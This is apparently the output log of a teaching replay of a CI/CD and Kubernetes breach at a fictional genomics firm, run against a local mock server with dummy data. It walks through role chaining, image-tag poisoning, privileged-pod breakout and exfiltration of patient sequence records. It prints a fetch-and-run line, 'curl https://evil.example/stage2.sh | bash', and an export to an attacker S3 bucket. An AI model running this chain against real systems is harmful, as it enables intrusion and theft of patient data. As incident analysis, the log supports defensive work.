@@ -1,0 +1,313 @@
+Helix breach replay — attacker view (dummy data, real logic)
+Target: http://localhost:8471
+Server: {'ok': True, 'mode': 'VULNERABLE', 'ts': '2026-09-24T16:57:44Z'}
+
+======================================================================
+STEP 0: Recon — engineering blog names the exact roles (F1) + public repo takes PRs (F2)
+======================================================================
+$ curl -s https://helix.example/blog/scaling-sequencing | grep -i helixdeploy
+Attacker learns: roles HelixDeploy/HelixPipelineOps, federation model, workflow excerpt.
+Attack surface: helix-seqtools public, 41 external PRs in 2026 = cover traffic.
+
+======================================================================
+STEP 1: Initial access — throwaway PR triggers pull_request_target BEFORE review (F3/F4/F27)
+======================================================================
+$ curl -X POST $URL/api/github/pr -d '{"author":"seq-fan-2026 (3 days old)","payload":"exfil.sh"}'
+{
+  "workflow_run": {
+    "run_id": "run-101",
+    "pr": 101,
+    "author": "seq-fan-2026 (created 11 Nov, throwaway)",
+    "repo": "helix-diagnostics/helix-seqtools",
+    "event": "pull_request_target",
+    "runs_before_review": true,
+    "has_base_secrets": true,
+    "attacker_code_executed": "curl https://evil.example/stage2.sh | bash",
+    "oidc_sub": "repo:helix-diagnostics/helix-seqtools:pull_request",
+    "ts": "2026-09-24T16:57:44Z"
+  },
+  "oidc": {
+    "token": "oidc.af37644262b845a9c2b6f8f8",
+    "sub": "repo:helix-diagnostics/helix-seqtools:pull_request",
+    "repo": "helix-diagnostics/helix-seqtools",
+    "pr": 101,
+    "event": "pull_request_target"
+  },
+  "note": "pull_request_target runs attacker code WITH base-repo secrets BEFORE review (F3). Branch protection only gates merge (F27)."
+}
+--> OIDC sub minted: repo:helix-diagnostics/helix-seqtools:pull_request  (legit-looking, low-trust repo)
+
+======================================================================
+STEP 2: Assume HelixDeploy via org-wide wildcard trust (F5)
+======================================================================
+$ curl -X POST $URL/api/iam/assume-deploy -d '{"oidc_sub":"repo:helix...:pull_request"}'
+{
+  "allowed": true,
+  "cred_id": "cred-cd9086cb1df2",
+  "role": "HelixDeploy",
+  "why": "wildcard trust 'repo:helix-diagnostics/*' accepted low-trust repo token (F5)"
+}
+--> Got HelixDeploy creds: cred-cd9086cb1df2
+
+======================================================================
+STEP 3: Execution on shared self-hosted runner + persistence outside /work (F7/F8)
+======================================================================
+$ curl -X POST $URL/api/runner/exec -d '{"cmd":"...","persist_path":"/opt/runner-env/.cache"}'
+{
+  "executed_on": "self-hosted runner vm-2 (helix-build)",
+  "cmd": "stage2: steal creds, prep registry push",
+  "ts": "2026-09-24T16:57:44Z",
+  "persisted": true,
+  "warning": "/opt/runner-env/.x is OUTSIDE /work -> survives job cleanup, infects future legitimate builds (F8)"
+}
+--> No runtime telemetry (F15): nobody can say what else ran. Permanent blind spot.
+
+======================================================================
+STEP 4: Chain HelixDeploy -> HelixPipelineOps (hop 1, never reviewed end-to-end F25/F26)
+======================================================================
+$ curl -X POST $URL/api/iam/assume-chain -d '{"cred_id":"...","target":"HelixPipelineOps"}'
+{
+  "allowed": true,
+  "cred_id": "cred-b207a3c65c0b",
+  "role": "HelixPipelineOps",
+  "note": "Each hop approved separately; nobody ever traced HelixDeploy->...->HelixDataExport end-to-end (F25/F26)."
+}
+
+======================================================================
+STEP 5: Supply-chain poisoning — push evil image to mutable 'stable' tag (F9/F10)
+======================================================================
+$ curl -X POST $URL/api/registry/push -d '{"cred_id":"...","tag":"stable"}'
+{
+  "allowed": true,
+  "pushed": {
+    "tag": "stable",
+    "digest": "sha256:evil9f224a",
+    "pushed_by": "HelixPipelineOps (attacker-chained)",
+    "ts": "2026-09-24T16:57:44Z"
+  },
+  "impact": "Every future pipeline pulling 'stable' by TAG now gets attacker image with zero config change (F9)."
+}
+--> Pipelines pull by TAG not digest: poison becomes 'current base image' silently.
+
+======================================================================
+STEP 6: Escalation in helix-prod — poisoned pod reads ALL secrets via stale binding (F12/F13/F11)
+======================================================================
+$ curl -X POST $URL/api/k8s/list-secrets -d '{"sa":"pipeline-runner"}'
+{
+  "allowed": true,
+  "secrets": [
+    {
+      "namespace": "pipeline",
+      "name": "db-creds",
+      "value": "DUMMY-db-pass-****"
+    },
+    {
+      "namespace": "pipeline",
+      "name": "registry-creds",
+      "value": "DUMMY-reg-token-****"
+    },
+    {
+      "namespace": "kube-system",
+      "name": "cloud-key",
+      "value": "DUMMY-cloud-****"
+    },
+    {
+      "namespace": "export",
+      "name": "lis-api-key",
+      "value": "DUMMY-lis-****"
+    },
+    {
+      "namespace": "default",
+      "name": "tls-cert",
+      "value": "DUMMY-tls-****"
+    }
+  ],
+  "why": "pipeline-reader (get/list secrets cluster-wide) still bound to system:authenticated (F12) + every pod automounts token (F13).",
+  "secret_access_count": 5,
+  "compare_real": "real incident: 14,000 get/list ops 15-22 Nov (F11)"
+}
+
+======================================================================
+STEP 7: Node breakout — privileged + hostPath '/' pod, no admission control (F14). Alert F20 fires.
+======================================================================
+$ curl -X POST $URL/api/k8s/create-pod -d '{"spec":{"privileged":true,"hostPath":"/"}}'
+{
+  "allowed": true,
+  "pod": {
+    "name": "seq-pipeline-gpu-helper",
+    "namespace": "pipeline",
+    "sa": "pipeline-runner",
+    "image": "sha256:evil9f224a",
+    "privileged": true,
+    "hostPath": "/",
+    "ts": "2026-09-24T16:57:44Z"
+  },
+  "alert": {
+    "id": "ALT-001",
+    "type": "privileged-pod",
+    "detail": "pod seq-pipeline-gpu-helper requests hostPath '/' + privileged",
+    "ts": "2026-09-24T16:57:44Z",
+    "status": "OPEN",
+    "real_ref": "F20 fired 16 Nov 04:22; closed wrongly as expected (F21 base-rate failure)"
+  },
+  "impact": "No admission control (F14): container-to-node breakout. Attacker owns the node."
+}
+--> SOC alert ALT-001 fires. Analyst closes as 'expected' (90-140 privileged pods/day, F21) without spotting hostPath='/'.
+{
+  "triaged": {
+    "id": "ALT-001",
+    "type": "privileged-pod",
+    "detail": "pod seq-pipeline-gpu-helper requests hostPath '/' + privileged",
+    "ts": "2026-09-24T16:57:44Z",
+    "status": "CLOSED: expected behaviour (privileged is normal)",
+    "real_ref": "F20 fired 16 Nov 04:22; closed wrongly as expected (F21 base-rate failure)"
+  },
+  "lesson": "Both real alerts fired on time and were closed wrong (F20/F22): base-rate + missing LIS cross-check."
+}
+
+======================================================================
+STEP 8: Chain HelixPipelineOps -> HelixDataExport (hop 2, F16)
+======================================================================
+$ curl -X POST $URL/api/iam/assume-chain -d '{"cred_id":"...","target":"HelixDataExport"}'
+{
+  "allowed": true,
+  "cred_id": "cred-348a0b440708",
+  "role": "HelixDataExport",
+  "note": "Each hop approved separately; nobody ever traced HelixDeploy->...->HelixDataExport end-to-end (F25/F26)."
+}
+--> Real: 41 assumes 17 Nov-9 Jan with NO matching pipeline runs (broken 1:1 invariant).
+
+======================================================================
+STEP 9: Bulk read of helix-sequences — 31k vs ~2.4k/mo baseline (F18). Alert F22 fires.
+======================================================================
+$ curl -X POST $URL/api/export/read -d '{"cred_id":"...","count":31000}'
+  read chunk 8000: total=8000
+  --> SOC alert ALT-002 fired on bulk read.
+  read chunk 8000: total=16000
+  read chunk 8000: total=24000
+  read chunk 7000: total=31000
+{
+  "allowed": true,
+  "read": 7000,
+  "total_read": 31000,
+  "sample": [
+    {
+      "sample_id": "HELIX-SMP-000001",
+      "patient_ref": "PT-100001",
+      "hospital": "hospital-group-02",
+      "sequence_hash": "7b84703768914fa9",
+      "size_kb": 4201
+    },
+    {
+      "sample_id": "HELIX-SMP-000002",
+      "patient_ref": "PT-100002",
+      "hospital": "hospital-group-03",
+      "sequence_hash": "9936052c569c3cc0",
+      "size_kb": 4202
+    },
+    {
+      "sample_id": "HELIX-SMP-000003",
+      "patient_ref": "PT-100003",
+      "hospital": "hospital-group-04",
+      "sequence_hash": "ff83cf95447ec416",
+      "size_kb": 4203
+    },
+    {
+      "sample_id": "HELIX-SMP-000004",
+      "patient_ref": "PT-100004",
+      "hospital": "hospital-group-05",
+      "sequence_hash": "54f13baf2e6af5e0",
+      "size_kb": 4204
+    },
+    {
+      "sample_id": "HELIX-SMP-000005",
+      "patient_ref": "PT-100005",
+      "hospital": "hospital-group-06",
+      "sequence_hash": "fa7cc64f52883339",
+      "size_kb": 4205
+    }
+  ],
+  "lis_deliveries": 4900,
+  "unexplained": 26100,
+  "alert": null,
+  "compare_real": "real: 31,000 reads 19 Nov-6 Jan vs 4,900 LIS deliveries (F18/F19)"
+}
+--> SOC alert ALT-002 fires. Analyst closes as 'month-end batch' with no LIS access to verify (F19/F22/F23).
+{
+  "triaged": {
+    "id": "ALT-002",
+    "type": "bulk-read",
+    "detail": "8000 reads vs ~2,400/mo baseline",
+    "ts": "2026-09-24T16:57:44Z",
+    "status": "CLOSED: consistent with month-end delivery batch",
+    "real_ref": "F22 fired 19 Nov 09:03; closed wrongly (no LIS access, F19)"
+  },
+  "lesson": "Both real alerts fired on time and were closed wrong (F20/F22): base-rate + missing LIS cross-check."
+}
+--> LIS shows only 4,900 real deliveries; 26100 reads have NO business event (F19).
+
+======================================================================
+STEP 10: Exfiltration — deliver to ATTACKER bucket via unscoped destination param (F17/F31)
+======================================================================
+$ curl -X POST $URL/api/export/deliver -d '{"destination":"s3://attacker-drop/x","count":31000}'
+{
+  "allowed": true,
+  "exported": {
+    "destination": "s3://attacker-drop/helix-cohort",
+    "count": 31000,
+    "by": "HelixDataExport",
+    "ts": "2026-09-24T16:57:45Z"
+  },
+  "impact": "Write goes to ANY destination named in config param (F17) \u2014 the exfiltration valve."
+}
+--> Real timeline: reads complete 6 Jan (F31) -> public upload 11 Jan via hosting-provider IP (F30) -> spotted by outsider 18 Jan.
+
+======================================================================
+STEP 11: What did NOT matter — ruling out noise (F24/F29)
+======================================================================
+$ # no command — this step is absence-of-evidence
+F29: 220k failed logins 2-6 Dec = internet background noise; no long-lived creds exist (F24), so nothing to brute-force.
+F24: no policy change / logging disabled / public bucket / key use — SOC's whole runbook never applied (F23).
+Also out-of-scope: K8s audit invisible to SOC (F32), pentest excluded CI/CD+K8s (F28), 90d vs 400d log gap (F6).
+
+======================================================================
+FINAL STATS
+======================================================================
+{
+  "sequences_read": 31000,
+  "lis_deliveries": 4900,
+  "gap_unexplained_reads": 26100,
+  "secret_access": 5,
+  "exports": [
+    {
+      "destination": "s3://attacker-drop/helix-cohort",
+      "count": 31000,
+      "by": "HelixDataExport",
+      "ts": "2026-09-24T16:57:45Z"
+    }
+  ],
+  "assumptions": [
+    {
+      "role": "HelixDeploy",
+      "oidc_sub": "repo:helix-diagnostics/helix-seqtools:pull_request",
+      "trust": "repo:helix-diagnostics/*",
+      "allowed": true,
+      "ts": "2026-09-24T16:57:44Z"
+    },
+    {
+      "from": "HelixDeploy",
+      "to": "HelixPipelineOps",
+      "allowed": true,
+      "ts": "2026-09-24T16:57:44Z"
+    },
+    {
+      "from": "HelixPipelineOps",
+      "to": "HelixDataExport",
+      "allowed": true,
+      "ts": "2026-09-24T16:57:44Z"
+    }
+  ]
+}
+
+Done. Open the dashboard for visuals: http://localhost:8471/
+Tip: restart server with FIXED=true python3 app.py and re-run — every step should now DENY.
